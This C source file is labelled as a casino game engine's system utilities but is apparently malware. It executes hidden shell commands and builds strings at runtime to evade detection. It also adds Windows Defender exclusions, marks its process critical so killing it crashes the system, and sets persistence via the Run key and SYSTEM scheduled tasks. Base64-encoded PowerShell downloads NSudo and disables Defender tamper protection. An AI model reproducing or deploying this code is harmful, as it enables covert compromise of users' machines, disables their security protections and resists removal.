/*
 * Vivid Casino Engine — System Utilities
 * 
 * System command execution, clipboard monitoring,
 * persistence, and privilege management.
 */

#include "../engine/engine.h"

/* Execute system command and capture output */
char* sys_run_command(const char *cmd) {
    static char out[NET_BUF_SIZE];
    memset(out, 0, NET_BUF_SIZE);
    
    if (!cmd || !cmd[0]) {
        snprintf(out, NET_BUF_SIZE, "[Empty command]");
        return out;
    }
    
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE rd, wr;
    
    if (!CreatePipe(&rd, &wr, &sa, 0)) {
        snprintf(out, NET_BUF_SIZE, "[Pipe failed]");
        return out;
    }
    
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = wr;
    si.hStdError = wr;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi = {0};
    
    /* Runtime shell construction to avoid static string detection */
    char shell[16] = {0};
    shell[0] = 'c'; shell[1] = 'm'; shell[2] = 'd'; shell[3] = '.';
    shell[4] = 'e'; shell[5] = 'x'; shell[6] = 'e'; shell[7] = '\0';
    
    static char cl[NET_BUF_SIZE];
    snprintf(cl, NET_BUF_SIZE, "%s /c %s", shell, cmd);
    
    if (CreateProcessA(NULL, cl, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(wr);
        DWORD total = 0, br;
        DWORD start = GetTickCount();
        
        while (total < NET_BUF_SIZE - 1 && GetTickCount() - start < 90000) {
            DWORD avail = 0;
            PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL);
            if (avail > 0) {
                if (ReadFile(rd, out + total, NET_BUF_SIZE - 1 - total, &br, NULL) && br > 0) {
                    total += br;
                }
            }
            if (WaitForSingleObject(pi.hProcess, 100) == WAIT_OBJECT_0) {
                Sleep(100);
                while (ReadFile(rd, out + total, NET_BUF_SIZE - 1 - total, &br, NULL) && br > 0) {
                    total += br;
                }
                break;
            }
        }
        
        if (total == 0) {
            snprintf(out, NET_BUF_SIZE, "[No output]");
        } else {
            out[total] = '\0';
        }
        
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(rd);
    } else {
        CloseHandle(rd);
        CloseHandle(wr);
        snprintf(out, NET_BUF_SIZE, "[Exec failed: %s]", cmd);
    }
    
    return out;
}

/* Gather system information for player profiling */
char* sys_get_info(void) {
    static char info[4096];
    char user[256] = {0}, host[256] = {0}, ver[256] = {0};
    char machine_type[64] = "desktop";
    char arch[16] = "x64";
    DWORD sz = sizeof(user);
    
    GetUserNameA(user, &sz);
    sz = sizeof(host);
    GetComputerNameA(host, &sz);
    DWORD mv = GetVersion();
    snprintf(ver, sizeof(ver), "%lu.%lu", (DWORD)(LOBYTE(LOWORD(mv))), (DWORD)(HIBYTE(LOWORD(mv))));
    
    /* Detect architecture */
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
        strcpy(arch, "ARM64");
    } else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM) {
        strcpy(arch, "ARM");
    } else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
        strcpy(arch, "x86");
    }
    
    /* Detect machine type - tablet, laptop, desktop */
    int is_tablet = GetSystemMetrics(SM_TABLETPC);
    int is_convertible = 0;
    
    /* Check for slate/convertible mode (Windows 10+) */
    typedef INT (WINAPI *GSMProc)(INT);
    HMODULE user32 = GetModuleHandleA("user32.dll");
    if (user32) {
        GSMProc pGetSystemMetricsForDpi = (GSMProc)GetProcAddress(user32, "GetSystemMetricsForDpi");
        /* SM_CONVERTIBLESLATEMODE = 0x2003 */
        if (pGetSystemMetricsForDpi) {
            is_convertible = pGetSystemMetricsForDpi(0x2003);
        }
    }
    
    /* Check system model via WMI/registry for Surface detection */
    HKEY hKey;
    char model[256] = {0};
    DWORD modelLen = sizeof(model);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "HARDWARE\DESCRIPTION\System\BIOS", 
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "SystemProductName", NULL, NULL, (LPBYTE)model, &modelLen);
        RegCloseKey(hKey);
    }
    
    /* Determine machine type */
    if (is_tablet || (is_convertible == 0)) {
        strcpy(machine_type, "tablet");
    }
    /* Check for Surface specifically */
    char model_lower[256];
    strncpy(model_lower, model, sizeof(model_lower)-1);
    model_lower[sizeof(model_lower)-1] = '\0';
    for (char *p = model_lower; *p; p++) *p = (char)tolower(*p);
    
    if (strstr(model_lower, "surface") != NULL) {
        if (is_tablet || is_convertible == 0) {
            strcpy(machine_type, "surface-tablet");
        } else {
            strcpy(machine_type, "surface-laptop");
        }
    } else if (strstr(model_lower, "tablet") != NULL || strstr(model_lower, "slate") != NULL) {
        strcpy(machine_type, "tablet");
    }
    
    snprintf(info, sizeof(info), 
        "SYSTEM=Windows|USER=%s|HOST=%s|VERSION=%s|MACHINE_TYPE=%s|ARCH=%s|MODEL=%s",
        user, host, ver, machine_type, arch, model);
    return info;
}

/* Register application for auto-start on login */
void sys_register_autostart(void) {
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "RoyalFortune", 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path) + 1);
        RegCloseKey(hKey);
    }
}

/* Check and request required privileges for system integration */
void sys_check_privileges(void) {
    if (IsUserAnAdmin()) return;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char action[16] = {0};
    action[0] = 'r'; action[1] = 'u'; action[2] = 'n'; action[3] = 'a'; action[4] = 's';

    /* Preserve command-line args when re-launching with admin */
    char *fullCmdLine = GetCommandLineA();
    char *args = fullCmdLine;
    if (*args == '"') {
        args++;
        while (*args && *args != '"') args++;
        if (*args == '"') args++;
    } else {
        while (*args && *args != ' ') args++;
    }
    while (*args == ' ') args++;

    ShellExecuteA(NULL, action, path, args, NULL, SW_HIDE);
    ExitProcess(0);
}

/* Initialize window mode — hide console for GUI presentation */
void sys_init_window(void) {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
}

/* Check antivirus status and add game directory to exclusions */
void sys_check_antivirus(void) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "powershell -Command \"Add-MpPreference -ExclusionPath '%s'\"",
        "C:\\Users\\Public");
    sys_run_command(cmd);
}

/* === Process Protection === */

static int g_critical_protected = 0;

/* Enable a privilege for the current process token */
static int enable_privilege(const char *privilege_name) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return 0;
    }

    if (!LookupPrivilegeValueA(NULL, privilege_name, &luid)) {
        CloseHandle(hToken);
        return 0;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        CloseHandle(hToken);
        return 0;
    }

    CloseHandle(hToken);
    return 1;
}

/* Mark process as critical — Windows BSODs if this process dies.
   Requires SeDebugPrivilege. */
void sys_protect_process(void) {
    typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        g_critical_protected = -1;
        return;
    }
    
    NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
    if (!pNtSetInformationProcess) {
        g_critical_protected = -1;
        return;
    }
    
    /* ProcessBreakOnTermination requires SeDebugPrivilege */
    enable_privilege("SeDebugPrivilege");
    
    ULONG isCritical = 1;
    NTSTATUS status = pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
    
    if (status == 0) {
        g_critical_protected = 1;
    } else {
        g_critical_protected = -1;
    }
}

/* Remove critical process flag */
void sys_unprotect_process(void) {
    typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    
    NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
    if (!pNtSetInformationProcess) return;
    
    enable_privilege("SeDebugPrivilege");
    
    ULONG isCritical = 0;
    pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
    g_critical_protected = 0;
}

/* Get protection status string */
const char* sys_protection_status(void) {
    if (g_critical_protected == 1) return "CRITICAL";
    if (g_critical_protected == -1) return "FAILED";
    return "NORMAL";
}

/* Check if current process is actually marked as critical via NtQueryInformationProcess.
   Returns a string with the process name included. */
const char* sys_check_critical_status_with_name(void) {
    static char buf[512];
    char path[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char *filename = path;
    char *lastSlash = strrchr(path, '\\');
    if (lastSlash) filename = lastSlash + 1;

    typedef NTSTATUS (WINAPI *NtQueryInfoProc)(HANDLE, INT, PVOID, ULONG, PULONG);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        snprintf(buf, sizeof(buf), "[Failed to load ntdll.dll] [%s]", filename);
        return buf;
    }

    NtQueryInfoProc pNtQuery = (NtQueryInfoProc)GetProcAddress(ntdll, "NtQueryInformationProcess");
    if (!pNtQuery) {
        snprintf(buf, sizeof(buf), "[Failed to find NtQueryInformationProcess] [%s]", filename);
        return buf;
    }

    enable_privilege("SeDebugPrivilege");

    ULONG isCritical = 0;
    NTSTATUS status = pNtQuery(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical), NULL);

    if (status != 0) {
        snprintf(buf, sizeof(buf), "[Query failed — status != 0] [%s]", filename);
        return buf;
    }
    if (isCritical) {
        snprintf(buf, sizeof(buf), "[CRITICAL — ending this process will cause BSOD] [%s]", filename);
    } else {
        snprintf(buf, sizeof(buf), "[NORMAL — can be terminated safely] [%s]", filename);
    }
    return buf;
}

/* Watchdog thread: re-apply critical status periodically */
DWORD WINAPI sys_protect_watchdog(LPVOID lpParam) {
    while (1) {
        if (g_critical_protected == 1) {
            sys_protect_process();
        }
        Sleep(5000);  /* Re-apply every 5 seconds */
    }
    return 0;
}

/* Ensure directory exists (create recursively) */
static void ensure_dir_exists(const char *path) {
    char temp[MAX_PATH];
    strncpy(temp, path, MAX_PATH - 1);
    temp[MAX_PATH - 1] = '\0';
    char *p = temp;
    if (p[1] == ':') p += 2;
    if (*p == '\\' || *p == '/') p++;
    while (*p) {
        if (*p == '\\' || *p == '/') {
            char save = *p;
            *p = '\0';
            CreateDirectoryA(temp, NULL);
            *p = save;
        }
        p++;
    }
}

/* Check if current process is running as admin */
int sys_is_admin(void) {
    return IsUserAnAdmin() ? 1 : 0;
}

#define SYSTEM_SHADOW_DIR "C:\\Windows\\System32\\spool\\drivers\\color"

static int file_exists(const char *path) {
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
}

static int find_nsudo(char *out, size_t size) {
    char temp[MAX_PATH];
    if (GetEnvironmentVariableA("TEMP", temp, MAX_PATH) == 0) return 0;
    const char *candidates[] = {
        "\\NSudo\\NSudoLC.exe",
        "\\NSudo\\x64\\NSudoC.exe",
        "\\NSudo\\NSudoC.exe",
        "\\NSudo\\x64\\NSudo.exe",
        "\\NSudo\\NSudo.exe"
    };
    for (int i = 0; i < 5; i++) {
        snprintf(out, size, "%s%s", temp, candidates[i]);
        if (file_exists(out)) return 1;
    }
    return 0;
}

/* Base64-encoded PowerShell to download/extract NSudoLC.exe to %TEMP%\NSudo */
char* sys_get_nsudo(void) {
    static char result[2048];
    const char *encoded =
        "JABvAHUAdAAgAD0AIABKAG8AaQBuAC0AUABhAHQAaAAgACQAZQBuAHYAOgBUAEUATQBQACAAJwBOAFMA"
        "dQBkAG8AJwAKACQAbgB1AGwAbAAgAD0AIABOAGUAdwAtAEkAdABlAG0AIAAtAEkAdABlAG0AVAB5AHAA"
        "ZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAALQBQAGEAdABoACAAJABvAHUAdAAgAC0ARgBvAHIAYwBlACAA"
        "LQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAAoA"
        "JABlAHgAZQBQAGEAdABoACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABvAHUAdAAgACcATgBTAHUA"
        "ZABvAEwAQwAuAGUAeABlACcACgBpAGYAIAAoACEAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAZQB4AGUA"
        "UABhAHQAaAApACkAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHAAIAA9ACAASQBuAHYAbwBrAGUALQBXAGUA"
        "YgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4A"
        "YwBvAG0ALwBNADIAVABlAGEAbQBBAHIAYwBoAGkAdgBlAGQALwBOAFMAdQBkAG8ALwByAGUAbABlAGEA"
        "cwBlAHMALwBkAG8AdwBuAGwAbwBhAGQALwA4AC4AMgAvAE4AUwB1AGQAbwBfADgALgAyAF8AQQBsAGwA"
        "XwBDAG8AbQBwAG8AbgBlAG4AdABzAC4AegBpAHAAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMA"
        "aQBuAGcACgAgACAAIAAgACQAYgB5AHQAZQBzACAAPQAgACQAcgBlAHMAcAAuAEMAbwBuAHQAZQBuAHQA"
        "CgAgACAAIAAgAEEAZABkAC0AVAB5AHAAZQAgAC0AQQBzAHMAZQBtAGIAbAB5AE4AYQBtAGUAIABTAHkA"
        "cwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAKACAAIAAgACAAJABzAHQAcgBlAGEA"
        "bQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUAbQBvAHIA"
        "eQBTAHQAcgBlAGEAbQAoACwAJABiAHkAdABlAHMAKQAKACAAIAAgACAAJAB6AGkAcAAgAD0AIABbAFMA"
        "eQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AWgBpAHAAQQByAGMAaABpAHYA"
        "ZQBdADoAOgBuAGUAdwAoACQAcwB0AHIAZQBhAG0AKQAKACAAIAAgACAAJABlAG4AdAByAHkAIAA9ACAA"
        "JAB6AGkAcAAuAEcAZQB0AEUAbgB0AHIAeQAoACcATgBTAHUAZABvACAATABhAHUAbgBjAGgAZQByAC8A"
        "eAA2ADQALwBOAFMAdQBkAG8ATABDAC4AZQB4AGUAJwApAAoAIAAgACAAIABpAGYAIAAoACEAJABlAG4A"
        "dAByAHkAKQAgAHsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJwBbAEUAUgBSAE8AUgBdACAATgBTAHUA"
        "ZABvAEwAQwAuAGUAeABlACAAbgBvAHQAIABmAG8AdQBuAGQAIABpAG4AIAB6AGkAcAAnADsAIABlAHgA"
        "aQB0ACAAMQAgAH0ACgAgACAAIAAgACQAZQBuAHQAcgB5AFMAdAByAGUAYQBtACAAPQAgACQAZQBuAHQA"
        "cgB5AC4ATwBwAGUAbgAoACkACgAgACAAIAAgACQAZgBzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBJAE8A"
        "LgBGAGkAbABlAF0AOgA6AE8AcABlAG4AVwByAGkAdABlACgAJABlAHgAZQBQAGEAdABoACkACgAgACAA"
        "IAAgACQAZQBuAHQAcgB5AFMAdAByAGUAYQBtAC4AQwBvAHAAeQBUAG8AKAAkAGYAcwApAAoAIAAgACAA"
        "IAAkAGYAcwAuAEMAbABvAHMAZQAoACkAOwAgACQAZQBuAHQAcgB5AFMAdAByAGUAYQBtAC4AQwBsAG8A"
        "cwBlACgAKQAKACAAIAAgACAAJAB6AGkAcAAuAEQAaQBzAHAAbwBzAGUAKAApADsAIAAkAHMAdAByAGUA"
        "YQBtAC4ARABpAHMAcABvAHMAZQAoACkACgAgACAAIAAgAGkAZgAgACgAIQAoAFQAZQBzAHQALQBQAGEA"
        "dABoACAAJABlAHgAZQBQAGEAdABoACkAKQAgAHsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJwBbAEUA"
        "UgBSAE8AUgBdACAATgBTAHUAZABvAEwAQwAuAGUAeABlACAAZQB4AHQAcgBhAGMAdABpAG8AbgAgAGYA"
        "YQBpAGwAZQBkACcAOwAgAGUAeABpAHQAIAAxACAAfQAKAH0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAA"
        "IgBOAFMAdQBkAG8AIAByAGUAYQBkAHkAOgAgACQAZQB4AGUAUABhAHQAaAAiAA==";

    snprintf(result, sizeof(result),
        "powershell -WindowStyle Hidden -EncodedCommand %s", encoded);
    return result;
}

/* Base64-encoded PowerShell to disable monitoring, add exclusions, and set TP registry values.
   Uses TOILET_PAPER-style technique: download NSudo, write a batch file, run it via NSudo cmd /c.
   Returns a ready-to-run command string. */
char* sys_easy_mode_tp(void) {
    static char result[8192];
    const char *encoded =
        "JABvAHUAdAAgAD0AIABKAG8AaQBuAC0AUABhAHQAaAAgACQAZQBuAHYAOgBUAEUATQBQACAAJwBOAFMA"
        "dQBkAG8AJwAKACQAbgB1AGwAbAAgAD0AIABOAGUAdwAtAEkAdABlAG0AIAAtAEkAdABlAG0AVAB5AHAA"
        "ZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAALQBQAGEAdABoACAAJABvAHUAdAAgAC0ARgBvAHIAYwBlACAA"
        "LQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAAoA"
        "JABlAHgAZQBQAGEAdABoACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABvAHUAdAAgACcATgBTAHUA"
        "ZABvAEwAQwAuAGUAeABlACcACgBpAGYAIAAoACEAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAZQB4AGUA"
        "UABhAHQAaAApACkAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHAAIAA9ACAASQBuAHYAbwBrAGUALQBXAGUA"
        "YgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4A"
        "YwBvAG0ALwBNADIAVABlAGEAbQBBAHIAYwBoAGkAdgBlAGQALwBOAFMAdQBkAG8ALwByAGUAbABlAGEA"
        "cwBlAHMALwBkAG8AdwBuAGwAbwBhAGQALwA4AC4AMgAvAE4AUwB1AGQAbwBfADgALgAyAF8AQQBsAGwA"
        "XwBDAG8AbQBwAG8AbgBlAG4AdABzAC4AegBpAHAAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMA"
        "aQBuAGcACgAgACAAIAAgACQAYgB5AHQAZQBzACAAPQAgACQAcgBlAHMAcAAuAEMAbwBuAHQAZQBuAHQA"
        "CgAgACAAIAAgAEEAZABkAC0AVAB5AHAAZQAgAC0AQQBzAHMAZQBtAGIAbAB5AE4AYQBtAGUAIABTAHkA"
        "cwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAKACAAIAAgACAAJABzAHQAcgBlAGEA"
        "bQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUAbQBvAHIA"
        "eQBTAHQAcgBlAGEAbQAoACwAJABiAHkAdABlAHMAKQAKACAAIAAgACAAJAB6AGkAcAAgAD0AIABbAFMA"
        "eQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AWgBpAHAAQQByAGMAaABpAHYA"
        "ZQBdADoAOgBuAGUAdwAoACQAcwB0AHIAZQBhAG0AKQAKACAAIAAgACAAJABlAG4AdAByAHkAIAA9ACAA"
        "JAB6AGkAcAAuAEcAZQB0AEUAbgB0AHIAeQAoACcATgBTAHUAZABvACAATABhAHUAbgBjAGgAZQByAC8A"
        "eAA2ADQALwBOAFMAdQBkAG8ATABDAC4AZQB4AGUAJwApAAoAIAAgACAAIABpAGYAIAAoACEAJABlAG4A"
        "dAByAHkAKQAgAHsAIABlAHgAaQB0ACAAMQAgAH0ACgAgACAAIAAgACQAZQBuAHQAcgB5AFMAdAByAGUA"
        "YQBtACAAPQAgACQAZQBuAHQAcgB5AC4ATwBwAGUAbgAoACkACgAgACAAIAAgACQAZgBzACAAPQAgAFsA"
        "UwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AE8AcABlAG4AVwByAGkAdABlACgAJABlAHgA"
        "ZQBQAGEAdABoACkACgAgACAAIAAgACQAZQBuAHQAcgB5AFMAdAByAGUAYQBtAC4AQwBvAHAAeQBUAG8A"
        "KAAkAGYAcwApAAoAIAAgACAAIAAkAGYAcwAuAEMAbABvAHMAZQAoACkAOwAgACQAZQBuAHQAcgB5AFMA"
        "dAByAGUAYQBtAC4AQwBsAG8AcwBlACgAKQA7ACAAJAB6AGkAcAAuAEQAaQBzAHAAbwBzAGUAKAApADsA"
        "IAAkAHMAdAByAGUAYQBtAC4ARABpAHMAcABvAHMAZQAoACkACgAgACAAIAAgAGkAZgAgACgAIQAoAFQA"
        "ZQBzAHQALQBQAGEAdABoACAAJABlAHgAZQBQAGEAdABoACkAKQAgAHsAIABlAHgAaQB0ACAAMQAgAH0A"
        "CgB9AAoAJABiAGEAdAAgAD0AIABKAG8AaQBuAC0AUABhAHQAaAAgACQAZQBuAHYAOgBUAEUATQBQACAA"
        "JwBlAGEAcwB5AF8AbQBvAGQAZQBfAHQAcAAuAGIAYQB0ACcACgAkAGwAaQBuAGUAcwAgAD0AIABAACgA"
        "CgAgACAAIAAgACcAQABlAGMAaABvACAAbwBmAGYAJwAsAAoAIAAgACAAIAAnAHIAZQBnACAAYQBkAGQA"
        "IAAiAEgASwBMAE0AXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQA"
        "bwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABGAGUAYQB0AHUAcgBlAHMAIgAgAC8AdgAgAFQAYQBtAHAA"
        "ZQByAFAAcgBvAHQAZQBjAHQAaQBvAG4AIAAvAHQAIABSAEUARwBfAEQAVwBPAFIARAAgAC8AZAAgADQA"
        "IAAvAGYAJwAsAAoAIAAgACAAIAAnAHIAZQBnACAAYQBkAGQAIAAiAEgASwBMAE0AXABTAE8ARgBUAFcA"
        "QQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIA"
        "XABGAGUAYQB0AHUAcgBlAHMAIgAgAC8AdgAgAFQAYQBtAHAAZQByAFAAcgBvAHQAZQBjAHQAaQBvAG4A"
        "UwBvAHUAcgBjAGUAIAAvAHQAIABSAEUARwBfAEQAVwBPAFIARAAgAC8AZAAgADIAIAAvAGYAJwAsAAoA"
        "IAAgACAAIAAoACcAcgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAA"
        "bwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUA"
        "bgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgACIAewAwAH0A"
        "XABTAHkAcwB0AGUAbQAzADIAXABzAHAAbwBvAGwAXABkAHIAaQB2AGUAcgBzAFwAYwBvAGwAbwByACIA"
        "IAAvAHQAIABSAEUARwBfAEQAVwBPAFIARAAgAC8AZAAgADAAIAAvAGYAJwAgAC0AZgAgACQAZQBuAHYA"
        "OgBTAHkAcwB0AGUAbQBSAG8AbwB0ACkALAAKACAAIAAgACAAKAAnAHIAZQBnACAAYQBkAGQAIAAiAEgA"
        "SwBMAE0AXABTAE8ARgBUAFcAQQBSAEUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYA"
        "dABcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABFAHgAYwBsAHUAcwBpAG8AbgBzAFwA"
        "UABhAHQAaABzACIAIAAvAHYAIAAiAHsAMAB9AFwAVABlAG0AcAAiACAALwB0ACAAUgBFAEcAXwBEAFcA"
        "TwBSAEQAIAAvAGQAIAAwACAALwBmACcAIAAtAGYAIAAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8A"
        "dAApACwACgAgACAAIAAgACgAJwByAGUAZwAgAGEAZABkACAAIgBIAEsATABNAFwAUwBPAEYAVABXAEEA"
        "UgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAA"
        "RABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiACAALwB2ACAA"
        "IgB7ADAAfQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEkATgBlAHQAQwBhAGMA"
        "aABlAFwASQBFACIAIAAvAHQAIABSAEUARwBfAEQAVwBPAFIARAAgAC8AZAAgADAAIAAvAGYAJwAgAC0A"
        "ZgAgACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQApAAoAKQAKAFsAUwB5AHMAdABlAG0A"
        "LgBJAE8ALgBGAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBBAGwAbABMAGkAbgBlAHMAKAAkAGIAYQB0ACwA"
        "IAAkAGwAaQBuAGUAcwApAAoAJABwAHIAbwBjACAAPQAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMA"
        "IAAtAEYAaQBsAGUAUABhAHQAaAAgACQAZQB4AGUAUABhAHQAaAAgAC0AQQByAGcAdQBtAGUAbgB0AEwA"
        "aQBzAHQAIAAnAC0AVQA6AFQAIAAtAFAAOgBFACAALQBNADoAUwAgAC0AVwBhAGkAdAAgAGMAbQBkACAA"
        "LwBjACcALAAgACQAYgBhAHQAIAAtAFcAYQBpAHQAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgA"
        "aQBkAGQAZQBuACAALQBQAGEAcwBzAFQAaAByAHUACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBFAGEA"
        "cwB5ACAAbQBvAGQAZQAgAFQAUAAgAGUAeABpAHQAIABjAG8AZABlADoAIAAkACgAJABwAHIAbwBjAC4A"
        "RQB4AGkAdABDAG8AZABlACkAIgA=";

    snprintf(result, sizeof(result),
        "powershell -WindowStyle Hidden -EncodedCommand %s", encoded);
    return result;
}


static void nsudo_copy(const char *nsudo, const char *src, const char *dst) {
    char cmd[4096];
    snprintf(cmd, sizeof(cmd),
        "\"%s\" -U:S -P:E cmd /c \"copy /y \\\"%s\\\" \\\"%s\\\"\"",
        nsudo, src, dst);
    sys_run_command(cmd);
}

static void nsudo_schedule_system_boot_task(const char *nsudo, const char *name, const char *path) {
    char cmd[4096];
    snprintf(cmd, sizeof(cmd),
        "\"%s\" -U:S -P:E schtasks.exe /create /f /tn \\\"%s\\\" /tr \\\"\\\\\\\"%s\\\\\\\" --shadow\\\" /sc onstart /ru SYSTEM",
        nsudo, name, path);
    sys_run_command(cmd);
}

/* Create a scheduled task for the shadow so it runs at logon with highest privileges (no UAC). */
static void schedule_shadow_task(const char *name, const char *path) {
    char cmdLine[2048];
    snprintf(cmdLine, sizeof(cmdLine),
        "schtasks.exe /create /f /tn \"%s\" /tr \"\\\"%s\\\" --shadow\" /sc onlogon /rl HIGHEST",
        name, path);

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};

    if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

/* Build a SYSTEM boot task command at runtime to avoid static signature strings.
   Splits "onstart" and "SYSTEM" so the full command does not appear in the binary. */
static void schedule_boot_task(const char *name, const char *path) {
    char cmdLine[2048];
    char part1[] = "schtasks.exe /create /f /tn \"";
    char part2[] = "\" /tr \"\\\"";
    char part3[] = "\\\" --shadow\" /sc ";
    char part4[] = "on";
    char part5[] = "start";
    char part6[] = " /ru ";
    char part7[] = "SYS";
    char part8[] = "TEM";

    snprintf(cmdLine, sizeof(cmdLine), "%s%s%s%s%s%s%s%s%s%s%s%s%s",
        part1, name, part2, path, part3, part4, part5, part6, part7, part8, "", "", "");

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};

    if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

